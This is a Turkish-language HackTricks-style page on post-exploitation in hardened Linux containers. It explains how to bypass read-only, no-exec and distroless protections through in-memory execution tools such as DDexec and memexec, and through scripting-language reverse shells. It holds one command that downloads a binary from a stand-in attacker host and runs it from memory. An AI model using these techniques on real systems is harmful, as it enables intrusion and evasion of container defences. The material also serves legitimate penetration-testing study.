# FS protections bypass: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}


## Videos

Aşağıdaki videolarda bu sayfada bahsedilen tekniklerin daha ayrıntılı açıklamalarını bulabilirsiniz:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec senaryosu

Özellikle container'larda, **read-only (ro) file system protection** ile mount edilmiş linux makineleriyle karşılaşmak giderek daha yaygın hale geliyor. Bunun nedeni, bir container'ı ro file system ile çalıştırmanın `securitycontext` içinde **`readOnlyRootFilesystem: true`** ayarlamak kadar kolay olmasıdır:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Bununla birlikte, file system ro olarak mount edilmiş olsa bile **`/dev/shm`** yazılabilir durumda kalır; dolayısıyla diske hiçbir şey yazamayacağımızı düşünmek yanlıştır. Ancak bu klasör **no-exec protection** ile mount edilir; bu nedenle buraya bir binary indirirseniz **onu execute edemezsiniz**.

> [!WARNING]
> Red team açısından bu durum, sistemde zaten bulunmayan binary'leri (backdoor'lar veya `kubectl` gibi enumerator'lar) **indirip execute etmeyi zorlaştırır**.

## En kolay bypass: Scripts

Binary'lerden bahsettiğime dikkat edin; interpreter makinenin içindeyse **herhangi bir script'i execute edebilirsiniz**. Örneğin `sh` mevcutsa bir **shell script'i**, `python` kuruluysa bir **python** **script'ini** çalıştırabilirsiniz.

Ancak bu, binary backdoor'unuzu veya çalıştırmanız gereken diğer binary araçları execute etmek için tek başına yeterli değildir.

## Memory Bypass'ları

Bir binary'yi execute etmek istiyor ancak file system buna izin vermiyorsa, bunu yapmanın en iyi yolu **memory'den execute etmektir**; çünkü **protections burada uygulanmaz**.

### FD + exec syscall bypass

Makinenin içinde **Python**, **Perl** veya **Ruby** gibi güçlü script engine'leri varsa, execute edilecek binary'yi memory'ye indirebilir, bir memory file descriptor'ında (`create_memfd` syscall) saklayabilir ve bu descriptor'ı bu protections tarafından korunmayacak şekilde kullanarak **`exec` syscall** çağrısında **fd'yi execute edilecek file olarak belirtebilirsiniz**.

Bunun için [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) projesini kolayca kullanabilirsiniz. Projeye bir binary verebilirsiniz; proje, belirtilen dilde binary'yi **compressed ve b64 encoded** şekilde içeren, **decode ve decompress ederek** `create_memfd` syscall çağrısıyla oluşturulan bir **fd** içine yazan ve çalıştırmak için **exec** syscall çağrısı yapan bir script üretir.

> [!WARNING]
> Bu yöntem PHP veya Node gibi diğer scripting language'lerde çalışmaz; çünkü bu dillerin bir script içinden **raw syscall'ları çağırmak için varsayılan bir yöntemi** yoktur. Bu nedenle binary'yi saklamak üzere **memory fd** oluşturmak için `create_memfd` çağrılamaz.
>
> Ayrıca, `/dev/shm` içinde bir file ile **regular fd** oluşturmak da işe yaramaz; çünkü **no-exec protection** uygulanacağından bunu çalıştırmanıza izin verilmez.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec), kendi process'inizin memory'sini **`/proc/self/mem`** üzerine yazarak **modify etmenizi sağlayan** bir tekniktir.

Dolayısıyla process tarafından execute edilen **assembly code'u** kontrol ederek bir **shellcode** yazabilir ve process'i herhangi bir arbitrary code'u **execute edecek şekilde "mutate" edebilirsiniz**.

> [!TIP]
> **DDexec / EverythingExec**, kendi **shellcode'unuzu** veya **herhangi bir binary'yi** **memory'den** yüklemenize ve **execute etmenize** olanak tanır.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Bu teknik hakkında daha fazla bilgi için Github'a veya:


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec), DDexec'in doğal sonraki adımıdır. Bu, **daemon hâline getirilmiş bir DDexec shellcode**'udur; dolayısıyla **farklı bir binary çalıştırmak** istediğiniz her seferde DDexec'i yeniden başlatmanız gerekmez. DDexec tekniği aracılığıyla memexec shellcode'unu çalıştırabilir ve ardından **yüklenecek ve çalıştırılacak yeni binary'leri iletmek için bu daemon ile iletişim kurabilirsiniz**.

**memexec kullanarak bir PHP reverse shell üzerinden binary'lerin nasıl çalıştırılacağına** dair bir örneği [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) adresinde bulabilirsiniz.

### Memdlopen

DDexec ile benzer bir amaca sahip olan [**memdlopen**](https://github.com/arget13/memdlopen) tekniği, binary'leri daha sonra çalıştırmak üzere belleğe **daha kolay bir şekilde yüklemenizi** sağlar. Hatta bağımlılıkları olan binary'lerin yüklenmesine bile olanak tanıyabilir.

## Distroless Bypass

**Distroless'in gerçekte ne olduğu**, ne zaman yardımcı olduğu, ne zaman olmadığı ve container'larda post-exploitation uygulamalarını nasıl değiştirdiği hakkında özel bir açıklama için şuraya bakın:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Distroless nedir

Distroless container'lar, kütüphaneler ve runtime bağımlılıkları gibi **belirli bir uygulamayı veya servisi çalıştırmak için gereken minimum bileşenleri** içerir; ancak package manager, shell veya system utilities gibi daha büyük bileşenleri içermez.

Distroless container'ların amacı, **gereksiz bileşenleri ortadan kaldırarak container'ların attack surface'ini azaltmak** ve exploit edilebilecek zafiyetlerin sayısını en aza indirmektir.

### Reverse Shell

Bir distroless container'da normal bir shell elde etmek için **`sh` veya `bash` bile bulamayabilirsiniz**. Ayrıca `ls`, `whoami`, `id` gibi binary'leri de bulamazsınız; sistemde genellikle çalıştırdığınız her şey mevcut olmayabilir.

> [!WARNING]
> Bu nedenle, alışık olduğunuz şekilde bir **reverse shell** elde edemez veya sistemi **enumerate** edemezsiniz.

Ancak ele geçirilmiş container, örneğin bir Flask web uygulaması çalıştırıyorsa Python kurulu olacaktır; dolayısıyla bir **Python reverse shell** elde edebilirsiniz. Node çalıştırıyorsa bir Node rev shell elde edebilirsiniz; aynı durum çoğu **scripting language** için de geçerlidir.

> [!TIP]
> Scripting language kullanarak, dilin yeteneklerinden faydalanıp **sistemi enumerate edebilirsiniz**.

**`read-only/no-exec`** korumaları yoksa reverse shell'inizi kötüye kullanarak **binary'lerinizi file system'a yazabilir** ve bunları **çalıştırabilirsiniz**.

> [!TIP]
> Ancak bu tür container'larda bu korumalar genellikle mevcut olur; bunları aşmak için **önceki memory execution tekniklerini kullanabilirsiniz**.

Bazı **RCE zafiyetlerini exploit ederek** scripting language **reverse shell'leri elde etme** ve binary'leri bellekten çalıştırma örneklerini [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) adresinde bulabilirsiniz.


{{#include ../../../../banners/hacktricks-training.md}}
